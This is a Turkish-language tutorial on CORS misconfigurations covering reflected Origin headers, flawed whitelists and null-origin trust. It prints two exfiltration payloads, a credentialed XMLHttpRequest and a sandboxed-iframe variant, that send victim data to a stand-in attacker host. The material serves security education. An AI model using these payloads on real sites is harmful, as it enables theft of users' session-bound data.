# CORS Nedir?

**CORS (Cross-Origin Resource Sharing)**, SOP (Same-Origin Policy) kısıtlamasını esnetmek için geliştirilmiş bir mekanizmadır.  
Tarayıcılar, bir web uygulamasının kendi origin’i dışındaki bir origin’e doğrudan istek göndermesini engeller. Ancak bu durum, günümüzde oldukça sık ihtiyaç duyulan bir durumdur.  
Örnek:  
- Frontend: `example.com`  
- API: `api.example.com`

---

## Origin Nedir?

Bir origin şu 3 parçadan oluşur:

- **Protokol:** `http`, `https`  
- **Host:** `example.com`  
- **Port:** `80`, `443`

**Örnek:**  
![Origin örneği](image.png)

---

## Preflight Request Nedir?

Tarayıcı, CORS kuralları kapsamında **asıl isteği göndermeden önce** hedef sunucudan izin alıp almadığını kontrol etmek için bir `OPTIONS` isteği yapar.  
Sunucu, bu isteğe uygun `Access-Control-Allow-*` header’larıyla cevap verirse, tarayıcı asıl isteği gönderir; aksi halde istek engellenir.

---

## Origin Header’ı Yansıtarak Dinamik ACAO Üretimi

Bazı uygulamalar, birden fazla domaine erişim izni vermek zorundadır. Bu genellikle, gelen HTTP isteğindeki `Origin` header’ını okuyup bunu doğrudan yanıtta `Access-Control-Allow-Origin` header’ı olarak yansıtarak yapılır.

Örnek isteği inceleyelim:

GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...


Sunucu şu şekilde yanıt verirse:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...


- `Access-Control-Allow-Origin` ile isteğin geldiği domain olan `malicious-website.com` alanına erişim izni verilmiştir.  
- `Access-Control-Allow-Credentials: true` ile çerez gibi kimlik doğrulama bilgileri içeren isteklerin kabul edildiği belirtilmiştir.  
- Bu, işlemin kullanıcının oturumunda gerçekleşmesini sağlar.

---

### Risk:

Eğer sunucu, `Access-Control-Allow-Origin` header’ında **herhangi bir Origin değerini yansıtıyorsa**, herhangi bir domain hedef uygulamadan veri okuyabilir.  
Eğer yanıt hassas veri (API anahtarı, CSRF token vb.) içeriyorsa, saldırgan şu JavaScript ile kolayca erişebilir:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};

Origin Header’larının Ayrıştırılmasında Hatalar

Bazı uygulamalar, birden fazla origin'e erişim vermek için whitelist kullanır.

Örnek:

GET /data HTTP/1.1
Host: normal-website.com
Origin: https://innocent-website.com

Uygulama, gelen Origin değerini whitelist ile karşılaştırır ve uygunsa yanıt verir:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://innocent-website.com

Yaygın Yanlış Yapılanlar

Bazı organizasyonlar, tüm mevcut ve gelecekteki alt domainlere izin verecek şekilde prefix, suffix veya regex tabanlı whitelist yapar.
Bu yapılandırma yanlış uygulanırsa, kontrol dışı domainlere erişim izni verilebilir.

Bypass teknikleri ve URL manipülasyonları için detaylı kaynak:
PortSwigger - URL Validation Bypass Cheat Sheet
Null Origin İzni ve Riskleri

Bazı uygulamalar, yerel geliştirme ortamlarını desteklemek için null origin değerine izin verebilir.

Örnek istek:

GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null

Sunucu cevabı:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

Bu durumda, saldırgan farklı yollarla Origin: null içeren bir cross-origin istek oluşturabilir.
Null Origin ile Sızdırma Payload’u

Aşağıdaki payload, bir data: URI içinde sandboxed iframe aracılığıyla null origin üretir ve hassas veriyi sızdırır:

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
  location='malicious-website.com/log?key='+this.responseText;
};
</script>">
</iframe>

Bu teknikle, Origin: null ile yapılan istek sunucu tarafından kabul edilirse, oturum tanımlı isteklerle hassas veriler sızdırılabilir.

